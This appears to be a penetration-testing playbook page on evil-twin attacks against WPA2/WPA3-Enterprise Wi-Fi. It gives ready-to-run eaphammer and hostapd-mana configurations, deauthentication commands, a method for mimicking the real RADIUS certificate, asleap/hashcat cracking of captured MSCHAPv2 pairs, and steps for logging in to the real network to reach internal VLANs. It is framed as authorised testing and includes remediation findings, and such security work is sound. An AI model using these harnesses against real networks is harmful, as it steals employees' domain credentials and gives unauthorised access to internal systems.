# Wireless - WPA2/WPA3-Enterprise and the evil twin

## AUTH=MGT changes the objective from key to credential

**Trigger:** The survey shows `MGT` in the AUTH column, or the AKM list contains 802.1X.

An enterprise network authenticates every user individually to a RADIUS server, so there is no shared passphrase in existence and every passphrase attack in this pack is inapplicable — anyone still capturing handshakes against an `MGT` network is burning the engagement. The objective becomes impersonating the authentication server well enough that a client completes its inner authentication against you, at which point you hold either a challenge/response pair reducible to the user's password or, if the client can be pushed onto a weak enough inner method, the password itself in cleartext. What makes this work is a client-side failure rather than a server-side one: the supplicant is supposed to validate the RADIUS server's certificate against a configured CA and refuse anything else, and in practice a large proportion of corporate devices are configured with validation disabled, with no CA pinned, or with a user-dismissible prompt. That is why this is the highest-yield attack against a mature corporate WLAN — the network can be perfectly configured and still fall to a single laptop whose supplicant was set up by hand. The credential you recover is a domain credential, not a Wi-Fi key, which is what makes this the usual entry point to the internal network.

```bash
sudo airodump-ng wlan0mon --essid "CorpWiFi-ENT"
#   ENC=WPA2  CIPHER=CCMP  AUTH=MGT   <- enterprise

# Identify the EAP methods in use from a real authentication
sudo airodump-ng wlan0mon -c 1 --essid "CorpWiFi-ENT" -w ent
tshark -r ent-01.cap -Y "eap" -T fields -e wlan.sa -e eap.type -e eap.identity
#   eap.type 25 = PEAP    21 = TTLS    13 = TLS    6 = GTC    4 = MD5

# Objective: credentials, not a key. Two harnesses below — eaphammer, or hostapd-mana.
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising an Enterprise Wi-Fi Network

## EAP identity disclosure: a finding available before any attack

**Trigger:** You have a capture containing any enterprise authentication attempt.

The EAP Identity Response is sent in the clear before the TLS tunnel is established, so every authentication on the network broadcasts the identity of the authenticating user or machine to anyone listening. In most corporate deployments that identity is the full `DOMAIN\username` or a UPN, which hands a passive observer the domain name, the username convention and a live roster of employees who are physically present — everything needed to build a target list for password spraying, phishing or the AS-REP enumeration you will run later on the internal network. This is worth capturing early because it costs nothing, needs no interaction, and gives you the username list that makes the rest of the engagement faster. It is also a legitimate standalone finding with a clean remediation: configure anonymous outer identities so the cleartext phase carries `anonymous@domain` while the real identity travels inside the tunnel. Most supplicants support this and most deployments never enable it. Note the machine accounts too — `host/WORKSTATION.domain.local` identities tell you the naming convention for computer objects, which is useful later.

```bash
sudo airodump-ng wlan0mon -c 1 --essid "CorpWiFi-ENT" -w eapcap

# Cleartext identities, before the tunnel
tshark -r eapcap-01.cap -Y "eap.code == 2 && eap.type == 1" \
  -T fields -e wlan.sa -e eap.identity | sort -u

# Wireshark: filter `eap` -> Response, Identity -> shows DOMAIN\username

# Build the username list the internal phase will use
tshark -r eapcap-01.cap -Y "eap.type == 1" -T fields -e eap.identity \
  | sed 's/.*\\//' | sort -u > users.txt
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Performing Karma & Mana Attack

## eaphammer: certificate, downgrade, capture

**Trigger:** An `MGT` network with clients present and authorisation to run a rogue AP and capture credentials.

`eaphammer` is the most direct harness for this: it generates the certificate chain, stands up the rogue authenticator, and negotiates downward through the EAP methods the client will accept. Start with `--cert-wizard` to build a CA and server certificate — the values you enter matter more than they look, because a client that displays the certificate to its user will show these fields, and a chain that reads like the client's own IT department is far more likely to be accepted. Then run with `--negotiate weakest`, which is the test that matters: it asks the client to fall back through the EAP methods until it finds one the supplicant will accept, and a supplicant that agrees to GTC hands over the password in cleartext inside the tunnel, while one that insists on MSCHAPv2 gives you a challenge/response pair to crack offline. Both are findings; the GTC case is much more severe and should be reported as such. Your rogue AP must be on the same channel as the target for clients to find it, and you generally need to deauthenticate to push them across — which means PMF on the real network blocks the steering step and you have to win on signal strength instead, so position matters. Read the console live: `mschapv2:` and `GTC:` blocks are the capture, and they appear seconds after a client associates.

```bash
# 1. Certificate chain — fill the fields to look like the client's own IT
sudo /opt/eaphammer/eaphammer --cert-wizard

# 2. Rogue authenticator, negotiating down to the weakest accepted method
sudo /opt/eaphammer/eaphammer --interface wlan1 --negotiate weakest \
  --auth wpa-eap --essid "CorpWiFi-ENT" --creds

# 3. Same channel as the real AP, then steer clients across
sudo iwconfig wlan0mon channel 1
sudo aireplay-ng --deauth 5 -a 9C:9A:03:39:BD:7A wlan0mon

# 4. What success looks like on the eaphammer console:
#    mschapv2: <date>
#      domain\username: jdorian
#      challenge: aa:f2:44:ed:0b:4e:d3:b3
#      response:  a936...dec2
#      hashcat NETNTLM: jdorian::::a936...dec2:aaf244ed0b4ed3b3
#    GTC: <date>
#      username: jdorian
#      password: <cleartext>          <- worst case for the client, best for you

# Loot and captured handshakes
ls /opt/eaphammer/loot/
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising an Enterprise Wi-Fi Network

## hostapd-mana with a hand-built EAP user file

**Trigger:** You need finer control over method negotiation than eaphammer's presets, or eaphammer will not run on your platform.

`hostapd-mana` gives you the same capability with the negotiation table exposed as a file you write yourself, which is the right tool when you know which method you want the client pushed toward and eaphammer's heuristics are choosing differently. Two configuration details are non-obvious and are where this usually fails. The first is that stock `hostapd` has none of the credential-capture hooks — using it instead of the mana build is exactly why `mana_credout` never produces a file — so build from the sensepost source. The second is the `eap_user` file, which drives the negotiation: the first line lists the outer methods offered to any identity, and the second line lists the inner methods for authenticated phase-2, ordered so the weakest acceptable method appears where the client will take it. Placing TTLS-PAP and GTC early is what produces cleartext passwords. Generate the certificate chain with subject fields mirroring the real network's RADIUS certificate where you can obtain it; a client configured to validate the server *name* but not the full chain will accept a certificate whose CN matches. Put the rogue AP on a different channel from the real AP if you have cloned its BSSID, or you will collide with it.

```bash
mkdir -p /opt/certs && cd /opt/certs
openssl genpkey -algorithm RSA -out ca-key.pem
openssl req -new -x509 -keyout ca-key.pem -out ca.pem -days 365 \
  -subj "/C=US/ST=California/L=San Francisco/O=Example/CN=corp.local" \
  -passout pass:challenge1234
openssl genpkey -algorithm RSA -out server-key.pem
openssl req -new -key server-key.pem -out server-csr.pem \
  -subj "/C=US/ST=California/L=San Francisco/O=Example/CN=corp.local" \
  -passin pass:challenge1234
openssl x509 -req -in server-csr.pem -CA ca.pem -CAkey ca-key.pem \
  -out server-cert.pem -CAcreateserial -passin pass:challenge1234

cat > /opt/certs/hostapd.eap_user <<'EOF'
*       TTLS,PEAP,TLS,MD5,GTC
"t"     TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5   "challenge1234"  [2]
EOF

cat > hostapd.conf <<'EOF'
interface=wlan1
ssid=CorpWiFi-ENT
channel=1
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
hw_mode=g
ieee8021x=1

eap_server=1
eap_user_file=/opt/certs/hostapd.eap_user
ca_cert=/opt/certs/ca.pem
server_cert=/opt/certs/server-cert.pem
private_key=/opt/certs/server-key.pem
private_key_passwd=whatever

enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
EOF

sudo hostapd-mana hostapd.conf
#   MANA EAP Identity Phase 0: CORP\jdorian
#   MANA EAP GTC | CORP\jdorian:<cleartext password>
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Performing Karma & Mana Attack; offsecexams.com OSWP cheatsheet

## Certificate mimicry against clients that validate loosely

**Trigger:** Clients refuse your rogue authenticator, or you want to raise the acceptance rate before committing to the attack.

A supplicant configured to validate the server certificate properly — correct CA pinned, server name enforced, user unable to override — will reject anything you present, and against such a fleet this attack simply fails, which is a good finding for the client. But many deployments sit in the middle: validation enabled but with no CA pinned, or with server-name matching only, or with a prompt the user can accept. Against those, a certificate that mirrors the real one's issuer and subject strings materially increases the acceptance rate, and building it costs a few minutes. Lift the genuine certificate off the air first — the RADIUS server sends it in the clear during the TLS handshake of any real authentication, so a capture of one legitimate client connecting contains it. Extract the issuer and subject, then regenerate your CA and server certificates with those exact strings. This does not defeat proper validation and is not supposed to; it defeats the common half-measure. Note the outcome carefully either way, because "clients accepted a self-signed certificate whose CN we copied from your own RADIUS server" and "clients correctly rejected our certificate" are opposite findings with opposite remediations.

```bash
# 1. Lift the real server certificate from a legitimate authentication
sudo airodump-ng wlan0mon -c 1 --essid "CorpWiFi-ENT" -w certcap
#    Wireshark: filter `eap` or `tls.handshake.type == 11`
#    right-click the Certificate -> Export Packet Bytes -> cert.der

openssl x509 -inform der -in cert.der -text -noout
openssl x509 -inform der -in cert.der -noout -issuer -subject

# 2. Mirror issuer/subject into the RADIUS cert configs and regenerate
#    /etc/freeradius/3.0/certs/ca.cnf and server.cnf
cd /etc/freeradius/3.0/certs/ && sudo rm -f dh && sudo make

# 3. Or feed the same strings to eaphammer's wizard / the openssl chain above

# Outcome is a finding either way:
#   accepted -> "clients do not validate the RADIUS server certificate"
#   rejected -> "certificate validation correctly enforced"
```

Source: offsecexams.com OSWP cheatsheet

## Cracking what you captured, and proving it works

**Trigger:** You hold an MSCHAPv2 challenge/response pair or a NetNTLM hash from the rogue authenticator.

PEAP-MSCHAPv2 gives you a challenge and a response rather than the password, and the reduction from that pair to the password is a well-understood offline problem: `asleap` runs it against a wordlist directly, and hashcat mode 5500 does the same at GPU speed with the pair reformatted as NetNTLMv1. eaphammer prints the hashcat-ready line for you, which is worth using rather than reassembling the fields by hand. A GTC capture needs no cracking at all because the password arrived in cleartext. Whichever you have, the step that turns it into a finding is authenticating to the *real* network as that user, which proves the credential is live and, more importantly, shows what the wireless network grants — in a corporate estate the enterprise SSID usually drops you onto a routed internal VLAN rather than a guest segment, and that is the pivot the whole engagement has been building toward. Connect from the command line with a `wpa_supplicant` configuration so it is reproducible and logged, then immediately read the routing table, because the new route is the evidence that the wireless finding has internal-network impact.

```bash
# MSCHAPv2 -> password
asleap -C aa:f2:44:ed:0b:4e:d3:b3 -R a936...dec2 -W /usr/share/wordlists/rockyou.txt
hashcat -m 5500 'jdorian::::a936...dec2:aaf244ed0b4ed3b3' /usr/share/wordlists/rockyou.txt

# Authenticate to the REAL network as that user
cat > ent.conf <<'EOF'
network={
    ssid="CorpWiFi-ENT"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="CORP\\jdorian"
    password="RecoveredPassword"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
EOF
sudo wpa_supplicant -B -i wlan2 -c ent.conf
sudo dhclient wlan2

sudo netstat -rn
#   0.0.0.0     172.16.10.60   0.0.0.0   UG   wlan2
#   172.16.10.0 0.0.0.0        255.255.255.0  U   wlan2     <- internal VLAN reached

# Continue: post-access-pivot.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising an Enterprise Wi-Fi Network; offsecexams.com OSWP cheatsheet

## Diagnosing an evil twin that captures nothing

**Trigger:** The rogue authenticator is running, clients are in range, and no credentials appear.

Four causes produce the same silence and they need different fixes, so distinguish before changing tactics. **EAP-TLS** authenticates the client with a certificate and private key rather than a password, so there is genuinely nothing inside the tunnel to steal — the supplicant may even complete the outer exchange with you and yield nothing. Confirm it from the EAP type in a capture of a legitimate authentication (`eap.type == 13`); if that is what the network uses, this attack cannot work and no amount of tuning changes that. **Wrong channel** is the most common mechanical failure: a client that never sees your beacon has not rejected you, it has not seen you, and `iwconfig` on the AP interface settles it in a second. **PMF on the real network** blocks the deauthentication you were relying on to steer clients across, so nothing moves; you have to win on raw signal strength instead, which means physically closer to the client than the real AP. **Certificate rejection** is the only one of the four that is a genuine client-side result, and it looks distinctive in the log — the client associates, EAP starts, and the exchange terminates immediately after the server certificate is presented. Watch for a split result across the fleet, which is the normal real-world outcome: a majority of centrally managed devices reject while one hand-configured laptop accepts, and one accepting supplicant is all the attack needs.

```bash
# Which EAP method is actually in use? 13 = TLS, and TLS has nothing to harvest.
tshark -r ent-01.cap -Y "eap" -T fields -e eap.type | sort -u

# Channel check
iwconfig wlan1                      # rogue AP interface
iwconfig wlan0mon                   # monitor interface

# Is your beacon actually on the air, from a second radio?
sudo airodump-ng wlan2mon --essid "CorpWiFi-ENT"

# Reading the hostapd/eaphammer log:
#   no association at all                     -> channel, or too far
#   associated, EAP started, dies after cert  -> certificate validation enforced
#   associated, EAP started, method 13        -> EAP-TLS; no credential exists
#   CTRL-EVENT-EAP-PROPOSED-METHOD then quiet -> supplicant refused the downgrade
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising an Enterprise Wi-Fi Network; operator practice
